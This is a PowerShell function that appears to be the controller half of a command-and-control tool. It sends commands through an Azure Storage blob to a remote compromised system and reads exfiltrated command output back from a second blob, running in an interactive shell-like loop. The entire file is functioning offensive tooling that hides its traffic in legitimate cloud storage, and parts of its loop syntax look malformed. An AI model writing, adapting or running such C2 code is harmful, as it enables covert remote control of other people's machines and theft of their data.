function Connect-AzureStorageC2Controller {
  <#
  .SYNOPSIS
    Sends commands to a remote host using Azure Storage.
  .DESCRIPTION
    'Connect-AzureStorageC2Controller' updates a blob designated by the 'CommandBlob' parameter
    with a command that should be executed on a remote system.
    Command output will be posted to the blob container designated by the 'ExfilBlob' parameter.
  .PARAMETER StorageAccountName
    Name of the Storage Account we will use to post commands and receive command output.
  .PARAMETER SasToken
    Shared Access Signature (SAS) used for AuthZ/AuthA
    The 'SasToken' parameter in not needed if the Storage Acount allows anonymous access.
  .PARAMETER Container
    The Container name that will hold our 'ExfilBlob' and 'CommandBlob'
  .PARAMETER ExfilBlob
    Blob that stores command output.
  .PARAMETER CommandBlob
    Blob that stores command to be executed.
  .PARAMETER BaseUri
    Azure endpoint that hosts the Storage Account. 'BaseUri' must be one of:
    ".blob.core.windows.net"
    ".blob.core.chinacloudapi.cn"
    ".blob.core.cloudapi.de"
    ".blob.core.usgovcloudapi.net"
  .PARAMETER Sleep
    Ammount of time 'Connect-AzureStorageC2Controller' should wait before checking for command output.
#>
  param (
    [Parameter()]
    [string]$StorageAccountName,

    [Parameter()]
    [string]$Container,

    [Parameter()]
    [string]$ExfilBlob,

    [Parameter()]
    [string]$CommandBlob,

    [Parameter()]
    [ValidateSet(".blob.core.windows.net",".blob.core.chinacloudapi.cn",".blob.core.cloudapi.de",".blob.core.usgovcloudapi.net")]
    [string]$baseUri = ".blob.core.windows.net",

    [Parameter()]
    [string]$SasToken,

    [Parameter()]
    [int]$Sleep = 200#,
  )

  function New-RFC1123DateUTC {
    $localTime = Get-Date
    $utcTime = $localTime.ToUniversalTime()
    foreach ($format in $utcTime.GetDateTimeFormats()){
        if($format -match "^\w{3},\s\d{2}\s\w{3}\s\d{4}\s\d{2}:\d{2}:\d{2}\sGMT$"){
            $format
            break
        }
    }
}

function New-AzureStorageApiHeader {
    param(
      [parameter(Mandatory=$true)]
      [string]$date
    )
    $guid = (New-Guid).Guid
    @{"x-ms-date"=$date;"x-ms-version"="2018-03-28";"x-ms-client-request-id"=$guid}
  }

  function Receive-AzureStorageBlobMetadata{
    param(
      [Parameter(mandatory=$true)]
      [string]$Blob
    ) # Compare the 'last-modified' find out if command have been updated.
    $operation = "?comp=metadata"
    $header = New-AzureStorageApiHeader -date (New-RFC1123DateUTC)
    $response = Invoke-WebRequest -Method Head -Headers $header -uri "${uri}${Container}/${blob}${operation}$($SasToken.Replace("?","&"))"
    $response.Headers
  }

  function Receive-Output{ #Invoke-WebRequest -Headers $header -Uri "$uri/$CommandBlob$sastoken"
    $header = New-AzureStorageApiHeader -date (New-RFC1123DateUTC)
    Invoke-RestMethod -Method Get -Headers $header -uri "${uri}${Container}/${ExfilBlob}${SasToken}"
  }

  function Send-Command {
    param(
      [parameter()]
      [string]$Command
    )
    $header = New-AzureStorageApiHeader -date (New-RFC1123DateUTC)
    $header.Add('x-ms-blob-type','BlockBlob')
    $response = Invoke-WebRequest -Method Put -Headers $header -uri "${uri}${Container}/${CommandBlob}${SasToken}" -Body $Command
    $response.StatusCode | Out-Null
  }

  $uri = "https://${Storageaccountname}${baseUri}/"
  $prompt = 'PS > '

  do {
    $commandOutput = Receive-Output
    $currentOutputTimeStamp = (Receive-AzureStorageBlobMetadata -blob $ExfilBlob).'last-modified'
    if ($commandOutput -match 'PS .+?@.+?>') {
      $prompt = $commandOutput
    }

    $newCommand  = Read-Host -Prompt $prompt
    Send-Command -Command $newCommand
    if ($newCommand -eq "exit") {
      start-sleep -Seconds 3
      Send-Command -Command ''
      break
    }

    do{
      $checkForNewOutput = (Receive-AzureStorageBlobMetadata -blob $ExfilBlob).'last-modified'
    }
    while ($currentOutputTimeStamp -ge $checkForNewOutput) {
      Start-Sleep $Sleep
      $checkForNewOutput = (Receive-AzureStorageBlobMetadata -blob $ExfilBlob).'last-modified'
    } | Out-Null

    Receive-Output
  }
  while ($newCommand -ne 'exit')
}